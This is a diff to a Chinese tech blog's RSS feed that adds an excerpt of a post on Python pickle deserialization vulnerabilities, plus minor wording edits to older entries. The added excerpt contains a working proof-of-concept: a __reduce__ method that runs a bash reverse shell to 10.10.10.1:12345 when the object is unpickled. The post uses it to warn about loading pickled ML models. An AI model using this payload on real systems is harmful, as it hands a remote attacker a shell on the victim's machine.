@@ -6,7 +6,36 @@
     <description>Recent content in 软件开发 on 蘭陵N梓記</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-CN</language>
-    <lastBuildDate>Sun, 07 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 13 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>飞哥讲代码24：从Python Pickle漏洞说起</title>
+      <link>http://lanlingzi.cn/post/technical/2021/0313_code/</link>
+      <pubDate>Sat, 13 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://lanlingzi.cn/post/technical/2021/0313_code/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;《泾溪》&amp;ndash; 杜荀鹤&lt;br&gt;
+泾溪石险人兢慎，终岁不闻倾覆人。&lt;br&gt;
+却是平流无石处，时时闻说有沉论。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
+&lt;p&gt;有次同事找我看个Python的安全问题。测试代码是这样的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;pickle&lt;/span&gt;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;os&lt;/span&gt;
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Test&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;object&lt;/span&gt;):
+    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;__reduce__&lt;/span&gt;(self):
+        cmd = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&amp;#34;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; (os.system,(cmd,))
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; __name__ == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+    test = Test()
+    bs = pickle.dumps(test)
+    pickle.loads(bs)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。&lt;/p&gt;
+&lt;p&gt;目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。&lt;/p&gt;</description>
+    </item>
+    
     <item>
       <title>飞哥讲代码23：C/C&#43;&#43;内存空洞</title>
       <link>http://lanlingzi.cn/post/technical/2021/0307_code/</link>
@@ -1385,8 +1414,8 @@ os.remove(file_name)
       
       <guid>http://lanlingzi.cn/post/thoughts/2019/0511_study/</guid>
       <description>&lt;h1 id=&#34;忽视的差距&#34;&gt;忽视的差距&lt;/h1&gt;
-&lt;p&gt;公司推崇工程师文化，提拔一些软件工程师作为标杆没有任何问题。事实上发现很难去标签化软件编码高手的特征。资深软件工程师和新手似乎看起来没啥区别，区别他们是异常困难，尤其这个群体中很多的人不愿意展现自己，他们可能藏在一个领域默默奉献着，不显山不露水。&lt;/p&gt;
-&lt;p&gt;软件开发中很多例行却看是平淡的活动，大家都能做到。以产品交付为中心的文化里，人人都是螺丝钉，往往忽然一个人的价值点，很少有人能愿意去了解甚至去分析新手与高手之间的差距。软件开发中专业性总容易被主管们忽视，也因此严重影响了软件工程师追求卓越的过程。曾经发生过可怕的高层观点：精英做架构，资深做设计，随便招个高中生编码就行了。试图把软件产品开发也做成像其它物理产品一样的流水线，这多么年来证明是错误的。&lt;/p&gt;</description>
+&lt;p&gt;事实上发现很难去标签化软件编码高手的特征。资深软件工程师和新手似乎看起来没啥区别，区别他们是异常困难，尤其这个群体中很多的人不愿意展现自己，他们可能藏在一个领域默默奉献着，不显山不露水。&lt;/p&gt;
+&lt;p&gt;软件开发中很多例行却看是平淡的活动，大家似乎都能做到。以产品交付为中心的文化里，人人都是螺丝钉，往往忽然一个人的价值点，很少有人能愿意去了解甚至去分析新手与高手之间的差距。软件开发中专业性总容易被主管们忽视，也因此严重影响了软件工程师追求卓越的过程。曾经发生过可怕的高层观点：精英做架构，资深做设计，随便招个高中生编码就行了。试图把软件产品开发也做成像其它物理产品一样的流水线，这多么年来证明是错误的。&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -1499,8 +1528,8 @@ os.remove(file_name)
       <pubDate>Sun, 31 Jan 2016 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/thoughts/2016/0131_unity_knowledge_action/</guid>
-      <description>&lt;p&gt;最近在走读团队的代码，有时实在是看不下去。不是因为他们的代码编写有很多Bugs，而是没有设计实现太复杂了。当面对众多的需求需要快速实现，没有几个人会去思考代码怎么写结构才更合理，而是在不断去搬砖垒需求。当我去咨询他们为什么要这样实现时，每个人能只能说出一，不知其二。即使自己写的代码，也不知道当初为什么这么实现。&lt;/p&gt;
-&lt;p&gt;同时，我们团队中不乏有各种兴趣小组。例如学习新的技术框架，交流设计模型，讨论重构技巧、性能优化经验。而实际在操作层面上，代码却正如前面所讲，有时真的不堪入目。由于这近在看王阳明传，突然想到我们没有&lt;code&gt;知行合一&lt;/code&gt;啊。&lt;/p&gt;</description>
+      <description>&lt;p&gt;最近在走读团队的代码，有时实在是看不下去。不是因为他们的代码编写有很多Bugs，而是没有设计实现太复杂了。当面对众多的需求需要快速实现，没有几个人会去思考代码怎么写结构才更合理，而是在不断去搬砖垒需求。当我去咨询他们为什么要这样实现时，每个人能只能说出其一，不知其二。即使自己写的代码，也不知道当初为什么这么实现。&lt;/p&gt;
+&lt;p&gt;同时，我们团队中不乏有各种兴趣小组。例如学习新的技术框架，交流设计模式，讨论重构技巧、性能优化经验。而实际在操作层面上，代码却正如前面所讲，有时真的不堪入目。正好这近在看王阳明传，突然想到我们没有&lt;code&gt;知行合一&lt;/code&gt;啊。&lt;/p&gt;</description>
     </item>
     
     <item>
